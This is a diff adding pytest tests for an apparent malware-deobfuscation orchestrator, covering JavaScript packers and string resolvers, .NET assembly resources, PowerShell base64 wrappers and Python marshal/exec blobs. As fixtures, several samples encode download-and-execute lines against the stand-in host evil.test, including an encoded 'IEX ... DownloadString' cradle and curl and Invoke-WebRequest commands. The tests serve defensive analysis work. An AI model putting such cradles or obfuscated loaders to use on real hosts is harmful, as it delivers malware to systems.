@@ -11,15 +11,30 @@ These tests verify that:
 
 from __future__ import annotations
 
+import base64
+import marshal
+import shutil
+
 import pytest
 
+from tests.dotnet_test_utils import (
+    build_resx,
+    build_test_dotnet_assembly,
+    build_test_dotnet_assembly_with_resources,
+)
 from app.models.schemas import AnalysisState, TransformRecord
 from app.services.analysis.action_queue import (
     ActionQueue,
     ActionStatus,
     QueuedAction,
 )
-from app.services.analysis.orchestrator import Orchestrator, Planner, Verifier
+from app.services.analysis.orchestrator import (
+    Orchestrator,
+    Planner,
+    StopAction,
+    StopDecision,
+    Verifier,
+)
 from app.services.analysis.state_manager import StateManager
 from app.services.transforms.base import TransformResult
 
@@ -458,6 +473,137 @@ class TestPlannerWorkspaceBundles:
         assert "deobfuscate_workspace_files" in names
 
 
+class TestPlannerPreprocessing:
+    def test_schedules_preprocess_for_minified_code(self):
+        code = (
+            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
+            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
+            "return fetch(url).then(r=>r.text());}"
+        )
+        sm = StateManager("minified", code, language="javascript")
+        q = ActionQueue()
+        planner = Planner(
+            available_actions={
+                "preprocess_source",
+                "detect_language",
+                "fingerprint_obfuscation",
+            }
+        )
+
+        actions = planner.plan(sm, q)
+        names = [item.action_name for item in actions]
+
+        assert "preprocess_source" in names
+
+
+class TestPlannerLLMGating:
+    def test_defers_llm_deobfuscation_while_targeted_decoder_is_pending(self):
+        sm = StateManager(
+            "llm-gating-early",
+            "const payload = atob('aGVsbG8=');",
+            language="javascript",
+        )
+        sm.advance_iteration()
+        sm.advance_iteration()
+        q = ActionQueue()
+        planner = Planner(
+            available_actions={
+                "decode_base64",
+                "llm_deobfuscate",
+            }
+        )
+
+        actions = planner.plan(sm, q)
+        names = [item.action_name for item in actions]
+
+        assert "decode_base64" in names
+        assert "llm_deobfuscate" not in names
+
+    def test_schedules_llm_deobfuscation_after_stall_with_evidence(self):
+        sm = StateManager(
+            "llm-gating-stall",
+            "var data = payload();",
+            language="javascript",
+        )
+        for _ in range(4):
+            sm.advance_iteration()
+        sm.increment_stall()
+        sm.increment_stall()
+        sm.add_suspicious_apis(["eval", "Function"])
+        sm.add_recovered_literals(["http://evil.test/payload"])
+        sm.add_imports(["child_process"])
+        q = ActionQueue()
+        planner = Planner(
+            available_actions={
+                "llm_deobfuscate",
+            }
+        )
+
+        actions = planner.plan(sm, q)
+        names = [item.action_name for item in actions]
+
+        assert "llm_deobfuscate" in names
+
+    def test_schedules_llm_deobfuscation_when_residual_wrappers_remain(self):
+        sm = StateManager(
+            "llm-gating-residual",
+            (
+                "var _0x4a2b=['aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ='];\n"
+                "var _0xf1=function(_0x1){return _0x4a2b[_0x1];};\n"
+                "const url = atob(_0xf1('0x0'));\n"
+                "eval('console' + '.' + 'log' + '(' + 'url' + ')');\n"
+            ),
+            language="javascript",
+        )
+        sm.advance_iteration()
+        sm.advance_iteration()
+        q = ActionQueue()
+        q.enqueue("identify_string_resolver", confidence=0.9)
+        q.dequeue()
+        q.mark_succeeded("identify_string_resolver")
+        planner = Planner(
+            available_actions={
+                "identify_string_resolver",
+                "constant_fold",
+                "llm_deobfuscate",
+            }
+        )
+
+        actions = planner.plan(sm, q)
+        names = [item.action_name for item in actions]
+
+        assert "llm_deobfuscate" in names
+
+
+class TestStopDecisionResiduals:
+    def test_does_not_stop_when_high_confidence_but_residual_markers_remain(self):
+        sm = StateManager(
+            "stop-residual",
+            (
+                "const decodedUrl = atob(resolveString('0x0'));\n"
+                "function run() {\n"
+                "    return decodedUrl;\n"
+                "}\n"
+            ),
+            language="javascript",
+        )
+        sm.advance_iteration()
+        sm.update_confidence(overall=0.9)
+        q = ActionQueue()
+        q.enqueue("llm_deobfuscate", confidence=0.6)
+        decision = StopDecision(sufficiency_threshold=0.85)
+
+        verdict = decision.evaluate(
+            sm,
+            q,
+            last_transform_success=True,
+            improvement_score=0.1,
+        )
+
+        assert verdict.action == StopAction.CONTINUE
+        assert "residual" in verdict.reason.lower() or "wrapper" in verdict.reason.lower()
+
+
 class TestOrchestratorStopRequests:
     @pytest.mark.asyncio
     async def test_run_respects_stop_request_before_first_iteration(self):
@@ -476,6 +622,27 @@ class TestOrchestratorStopRequests:
         assert result.iterations == 0
         assert "Stop requested by user" in result.stop_reason
         assert result.state.iteration_state["stopped"] is True
+
+    @pytest.mark.asyncio
+    async def test_run_bootstraps_preprocessing_before_iterations(self):
+        code = (
+            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
+            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
+            "return fetch(url).then(r=>r.text());}"
+        )
+        orchestrator = Orchestrator(
+            sample_id="preprocess-test",
+            original_code=code,
+            language="javascript",
+        )
+
+        result = await orchestrator.run(max_iterations=1)
+
+        assert any(
+            item.action == "preprocess_source"
+            for item in result.state.transform_history
+        )
+        assert "\n" in result.deobfuscated_code
 
 
 
@@ -555,6 +722,32 @@ function fetchUserData(userId) {
         )
 
         improvement = verifier.verify(before, after, result, sm)
+
+        assert improvement > 0.05
+
+    def test_identified_sinks_increase_improvement_score(self):
+        code = "eval(payload);"
+        verifier = Verifier()
+        sm = StateManager("sink-verify", code, language="javascript")
+        result = TransformResult(
+            success=True,
+            output=code,
+            confidence=0.85,
+            description="Identified an execution sink.",
+            details={
+                "identified_sinks": [
+                    {
+                        "api": "eval",
+                        "family": "dynamic_code_execution",
+                        "severity": "high",
+                        "argument": "payload",
+                    }
+                ],
+                "suspicious_apis": ["eval:high"],
+            },
+        )
+
+        improvement = verifier.verify(code, code, result, sm)
 
         assert improvement > 0.05
 
@@ -647,3 +840,314 @@ class TestSnapshotAndRollback:
         assert d["sample_id"] == "test-id"
         assert d["current_iteration"] == 0
         assert "state" in d
+
+
+class TestOrchestratorDecoderCoverage:
+    @pytest.mark.asyncio
+    async def test_javascript_array_resolver_runs_in_orchestrator(self):
+        code = (
+            "var _0xabc=['a','b','c'];"
+            "(function(_0xArr,_0xRot){while(--_0xRot)_0xArr.push(_0xArr.shift());})"
+            "(_0xabc,0x1);"
+            "console.log(_0xabc[0]);"
+        )
+        result = await Orchestrator(
+            sample_id="js-array-resolver",
+            original_code=code,
+            language="javascript",
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert "identify_string_resolver" in actions
+        assert 'console.log("b");' in result.deobfuscated_code
+
+    @pytest.mark.asyncio
+    async def test_javascript_packer_runs_in_orchestrator(self):
+        code = (
+            "eval(function(p,a,c,k,e,d){\n"
+            "    e=function(c){return c.toString(a)};\n"
+            "    if(!''.replace(/^/,String)){\n"
+            "        while(c--)d[c.toString(a)]=k[c]||c.toString(a);\n"
+            "        k=[function(e){return d[e]}];\n"
+            "        e=function(){return'\\\\w+'};\n"
+            "        c=1;\n"
+            "    }\n"
+            "    while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);\n"
+            "    return p;\n"
+            "}(\n"
+            "    '0(\\'1\\');',\n"
+            "    2,\n"
+            "    2,\n"
+            "    'alert|test'.split('|'),\n"
+            "    0,\n"
+            "    {}\n"
+            "))"
+        )
+        result = await Orchestrator(
+            sample_id="js-packer",
+            original_code=code,
+            language="javascript",
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert "unpack_js_packer" in actions
+        assert "alert('test');" in result.deobfuscated_code
+
+    @pytest.mark.asyncio
+    async def test_javascript_runtime_encoder_runs_in_orchestrator(self):
+        code = '[]["filter"]["constructor"]("alert(\\"ok\\")")()'
+        result = await Orchestrator(
+            sample_id="js-encoder",
+            original_code=code,
+            language="javascript",
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert "decode_js_encoder" in actions
+        assert 'alert("ok")' in result.deobfuscated_code
+
+    @pytest.mark.asyncio
+    async def test_dotnet_assembly_analyzer_runs_in_orchestrator(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        assembly = build_test_dotnet_assembly(
+            """
+            using System;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string Beacon()
+                {
+                    return "http://evil.test/a";
+                }
+            }
+            """,
+            "OrchestratorAssemblySample",
+        )
+        result = await Orchestrator(
+            sample_id="dotnet-assembly",
+            original_code=assembly.decode("latin-1"),
+            language=None,
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert result.language == "dotnet"
+        assert "analyze_dotnet_assembly" in actions
+        assert "public string Beacon()" in result.deobfuscated_code
+        assert "http://evil.test/a" in result.deobfuscated_code
+
+    @pytest.mark.asyncio
+    async def test_dotnet_embedded_resource_text_flows_through_orchestrator(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        assembly = build_test_dotnet_assembly_with_resources(
+            """
+            using System.IO;
+            using System.Reflection;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string ReadPayload()
+                {
+                    using Stream stream = Assembly.GetExecutingAssembly()
+                        .GetManifestResourceStream("DotNetResourceOrchestrator.stage.txt")!;
+                    using var reader = new StreamReader(stream);
+                    return reader.ReadToEnd();
+                }
+            }
+            """,
+            "DotNetResourceOrchestrator",
+            {"stage.txt": "Invoke-WebRequest http://evil.test/a"},
+        )
+        result = await Orchestrator(
+            sample_id="dotnet-resource",
+            original_code=assembly.decode("latin-1"),
+            language=None,
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert result.language == "dotnet"
+        assert "analyze_dotnet_assembly" in actions
+        assert "DotNetResourceOrchestrator.stage.txt" in result.deobfuscated_code
+        assert "Invoke-WebRequest http://evil.test/a" in result.deobfuscated_code
+        assert "Invoke-WebRequest http://evil.test/a" in [item.value for item in result.strings]
+
+    @pytest.mark.asyncio
+    async def test_dotnet_resx_resource_manager_strings_flow_through_orchestrator(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        assembly = build_test_dotnet_assembly_with_resources(
+            """
+            using System.Globalization;
+            using System.Reflection;
+            using System.Resources;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                private static readonly ResourceManager ResourceManager =
+                    new("DotNetResxOrchestrator.Strings", typeof(Loader).Assembly);
+
+                public static string ReadPayload()
+                {
+                    return ResourceManager.GetString("Payload", CultureInfo.InvariantCulture)!;
+                }
+            }
+            """,
+            "DotNetResxOrchestrator",
+            {"Strings.resx": build_resx({"Payload": "curl https://evil.test/resx"})},
+        )
+        result = await Orchestrator(
+            sample_id="dotnet-resx-resource",
+            original_code=assembly.decode("latin-1"),
+            language=None,
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert result.language == "dotnet"
+        assert "analyze_dotnet_assembly" in actions
+        assert "DotNetResxOrchestrator.Strings.resources" in result.deobfuscated_code
+        assert "curl https://evil.test/resx" in result.deobfuscated_code
+        assert "curl https://evil.test/resx" in [item.value for item in result.strings]
+
+    @pytest.mark.asyncio
+    async def test_dotnet_compressed_and_field_backed_helpers_flow_through_orchestrator(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        assembly = build_test_dotnet_assembly(
+            """
+            using System;
+            using System.IO;
+            using System.IO.Compression;
+            using System.Text;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                private static readonly string Blob = "H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA==";
+
+                public static string Inflate()
+                {
+                    using var source = new MemoryStream(Convert.FromBase64String(Blob));
+                    using var gzip = new GZipStream(source, CompressionMode.Decompress);
+                    using var reader = new StreamReader(gzip, Encoding.UTF8);
+                    return reader.ReadToEnd();
+                }
+            }
+            """,
+            "DotNetCompressedHelperOrchestrator",
+        )
+        result = await Orchestrator(
+            sample_id="dotnet-compressed-helper",
+            original_code=assembly.decode("latin-1"),
+            language=None,
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert result.language == "dotnet"
+        assert "analyze_dotnet_assembly" in actions
+        assert 'return "hello world";' in result.deobfuscated_code
+        assert "hello world" in [item.value for item in result.strings]
+
+    @pytest.mark.asyncio
+    async def test_auto_detected_powershell_wrapper_decodes(self):
+        blob = (
+            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
+            "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
+            "dAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBhACcAKQA="
+        )
+        code = (
+            "iex ([System.Text.Encoding]::Unicode.GetString("
+            f"[System.Convert]::FromBase64String('{blob}')))"
+        )
+        result = await Orchestrator(
+            sample_id="ps-wrapper",
+            original_code=code,
+            language=None,
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert result.language == "powershell"
+        assert "decode_base64" in actions
+        assert "powershell_decode" in actions
+        assert "http://evil.test/a" in result.deobfuscated_code
+
+    @pytest.mark.asyncio
+    async def test_single_use_string_decryptor_runs_through_orchestrator(self):
+        code = (
+            "function decodeString(s){return s.split('').reverse().join('');}\n"
+            'alert(decodeString("cba"));'
+        )
+        result = await Orchestrator(
+            sample_id="string-helper",
+            original_code=code,
+            language="javascript",
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert "decrypt_strings" in actions
+        assert '"abc"' in result.deobfuscated_code
+        assert "abc" in [item.value for item in result.strings]
+
+    @pytest.mark.asyncio
+    async def test_python_serialization_decoder_runs_in_orchestrator(self):
+        payload = marshal.dumps(
+            compile(
+                'import os\nurl="http://evil.test"\ndef beacon():\n    return os.name\nprint(beacon())',
+                "<x>",
+                "exec",
+            )
+        )
+        blob = base64.b64encode(payload).decode()
+        code = (
+            "import base64, marshal\n"
+            f'exec(marshal.loads(base64.b64decode("{blob}")))'
+        )
+        result = await Orchestrator(
+            sample_id="python-serialization",
+            original_code=code,
+            language="python",
+        ).run(max_iterations=12)
+
+        actions = [item.action for item in result.transform_history]
+        assert "decode_python_serialization" in actions
+        assert "http://evil.test" in result.deobfuscated_code
+        assert "http://evil.test" in [item.value for item in result.strings]
+        assert "os" in result.state.imports
+        assert "beacon" in result.state.functions
+
+    @pytest.mark.asyncio
+    async def test_xor_decimal_array_runs_in_orchestrator(self):
+        code = "const data = [29,16,25,25,26]; data.map(b => b ^ 0x75)"
+        result = await Orchestrator(
+            sample_id="xor-decimal",
+            original_code=code,
+            language="javascript",
+        ).run(max_iterations=12)
+
+        actions = [item.action for item in result.transform_history]
+        assert "try_xor_recovery" in actions
+        assert "hello" in result.deobfuscated_code
+        assert "hello" in [item.value for item in result.strings]
+
+    @pytest.mark.asyncio
+    async def test_python_exec_compile_literal_chain_runs_in_orchestrator(self):
+        code = (
+            'src = "print(\\"hi\\")"\n'
+            "exec(compile(src, '<x>', 'exec'))"
+        )
+        result = await Orchestrator(
+            sample_id="python-exec-compile",
+            original_code=code,
+            language="python",
+        ).run(max_iterations=10)
+
+        actions = [item.action for item in result.transform_history]
+        assert "python_decode" in actions
+        assert 'print("hi")' in result.deobfuscated_code
